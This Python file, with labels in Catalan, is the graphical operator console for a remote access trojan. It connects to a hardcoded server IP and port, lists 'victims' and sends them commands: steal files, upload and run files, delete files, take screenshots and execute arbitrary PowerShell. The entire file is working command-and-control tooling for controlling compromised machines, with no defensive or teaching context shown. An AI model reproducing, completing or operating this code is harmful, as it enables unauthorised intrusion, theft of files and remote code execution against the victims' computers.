import sys
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTextEdit, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QLabel, QFileDialog, QMessageBox, QComboBox, QInputDialog
)
from PySide6.QtCore import Qt, QThread, Signal
from backAtacant import RemoteClient, ConnectionError

class CommandThread(QThread):
    output_signal = Signal(str)
    error_signal = Signal(str)

    def __init__(self, client, command, file_dialog=False):
        super().__init__()
        self.client = client
        self.command = command
        self.file_dialog = file_dialog

    def run(self):
        try:
            output = self.client.execute_command(self.command, use_dialog=self.file_dialog)
            self.output_signal.emit(output)
        except Exception as e:
            self.error_signal.emit(str(e))

class RemoteControlApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Control remot - Interfície gràfica")
        self.setMinimumSize(900, 600)

        self.client = RemoteClient("51.20.84.35", 5555)

        self.threads = []
        self.init_ui()
        self.connect_to_server()

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setStyleSheet("font-family: Consolas; font-size: 12px;")

        self.command_input = QLineEdit()
        self.command_input.returnPressed.connect(self.send_command)

        self.victim_selector = QComboBox()
        self.victim_selector.setPlaceholderText("Selecciona víctima")
        self.select_button = QPushButton("Connectar")
        self.select_button.clicked.connect(self.select_victim)

        top_layout = QHBoxLayout()
        top_layout.addWidget(QLabel("Víctima:"))
        top_layout.addWidget(self.victim_selector)
        top_layout.addWidget(self.select_button)

        self.command_buttons = {
            "get": QPushButton("Get"),
            "post": QPushButton("Post"),
            "dl": QPushButton("Delete"),
            "run": QPushButton("Run"),
            "ss": QPushButton("Capturar Pantalla"),
            "ps": QPushButton("PowerShell"),
            "ls": QPushButton("Llistar Fitxers"),
            "path": QPushButton("Path"),
            "info": QPushButton("Info"),
            "help": QPushButton("Help"),
            "exit": QPushButton("Exit"),
        }

        for cmd, btn in self.command_buttons.items():
            if cmd == "get":
                btn.clicked.connect(self.handle_get_command)
            elif cmd == "post":
                btn.clicked.connect(self.handle_post_command)
            elif cmd == "dl":
                btn.clicked.connect(self.handle_dl_command)
            elif cmd == "run":
                btn.clicked.connect(self.handle_run_command)
            elif cmd == "ps":
                btn.clicked.connect(self.handle_ps_command)
            elif cmd == "help":
                btn.clicked.connect(self.show_help_dialog)
            elif cmd == "exit":
                btn.clicked.connect(self.handle_exit_command)
            else:
                btn.clicked.connect(lambda _, c=cmd: self.send_command(c))

        button_layout = QHBoxLayout()
        for btn in self.command_buttons.values():
            button_layout.addWidget(btn)

        main_layout = QVBoxLayout()
        main_layout.addLayout(top_layout)
        main_layout.addWidget(QLabel("Shell>"))
        main_layout.addWidget(self.command_input)
        main_layout.addLayout(button_layout)
        main_layout.addWidget(QLabel("Sortida:"))
        main_layout.addWidget(self.output_area)

        central_widget.setLayout(main_layout)

    def connect_to_server(self):
        try:
            self.client.connect()
            victims = self.client.get_victims()

            self.victim_selector.clear()
            for line in victims:
                if ": " in line:
                    index, display = line.split(": ", 1)
                    self.victim_selector.addItem(display.strip(), index.strip())
            self.log_output("Connexió establerta. Víctimes disponibles carregades.")
        except ConnectionError as e:
            self.show_error("Error de connexió", str(e))

    def select_victim(self):
        index = self.victim_selector.currentData()
        if index is not None:
            try:
                response = self.client.select_victim(index)
                self.log_output(response)
            except Exception as e:
                self.show_error("Error seleccionant víctima", str(e))

    def handle_get_command(self):
        remotefile, ok = QInputDialog.getText(self, "Nom del fitxer", "Quin fitxer vols obtenir?")
        if not ok or not remotefile:
            return

        save_path, _ = QFileDialog.getSaveFileName(self, "On vols desar el fitxer?", remotefile.strip())
        if not save_path:
            return

        self.send_command(f"get {remotefile}::{save_path}")

    def handle_post_command(self):
        path, _ = QFileDialog.getOpenFileName(self, "Selecciona fitxer per enviar")
        if path:
            filename = path.split("/")[-1]
            self.send_command(f"post {filename}", file_dialog=True)
    
    def handle_dl_command(self):
        com, ok = QInputDialog.getText(self, "Nom del fitxer", "Quin fitxer vols esborrar?")
        if not ok or not com:
            return

        self.send_command(f"dl {com}")
    
    def handle_run_command(self):
        com, ok = QInputDialog.getText(self, "Nom del fitxer", "Quin fitxer vols executar?")
        if not ok or not com:
            return

        self.send_command(f"run {com}")

    def handle_ps_command(self):
        com, ok = QInputDialog.getText(self, "Comanda", "Quina comanda vols executar?")
        if not ok or not com:
            return

        self.send_command(f"ps {com}")
    
    def show_help_dialog(self):
        text = (
            "Info: Informació del sistema de la víctima\n"
            "Get <fitxer>: Descarrega un fitxer de la víctima\n"
            "Post <fitxer>: Envia un fitxer a la víctima\n"
            "Run <fitxer>: Executa un fitxer a la víctima\n"
            "Dl <fitxer>: Esborra un fitxer a la víctima\n"
            "Ss: Captura de pantalla\n"
            "Cd <directori>: Canvia de directori\n"
            "Ls: Llista els fitxers\n"
            "Path: Mostra el directori actual\n"
            "Ps <ordre>: Executa comanda PowerShell\n"
            "Exit: Tanca la connexió\n"
            "Total exit: Tanca i desconnecta la víctima"
        )
        QMessageBox.information(self, "Comandes disponibles", text)

    def handle_exit_command(self):
        resposta = QMessageBox.question(
            self,
            "Confirmació",
            "Vols tancar també la connexió de la víctima?",
            QMessageBox.Yes | QMessageBox.No
        )
        if resposta == QMessageBox.Yes:
            self.send_command("total exit")
        else:
            self.send_command("exit")

    def send_command(self, cmd=None, file_dialog=False):
        command = cmd if cmd else self.command_input.text().strip()
        if not command:
            return
        self.command_input.clear()
        thread = CommandThread(self.client, command, file_dialog)
        thread.output_signal.connect(self.log_output)
        thread.error_signal.connect(lambda e: self.show_error("Error executant comanda", e))

        thread.finished.connect(lambda: self.threads.remove(thread))

        self.threads.append(thread)
        thread.start()

    def log_output(self, text):
        self.output_area.append(text)

    def show_error(self, title, message):
        QMessageBox.critical(self, title, message)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = RemoteControlApp()

    with open("styles.qss", "r") as f:
        app.setStyleSheet(f.read())

    #window.showFullScreen() 
    window.show() # o window.show() per mostrar finestra normal
    sys.exit(app.exec())
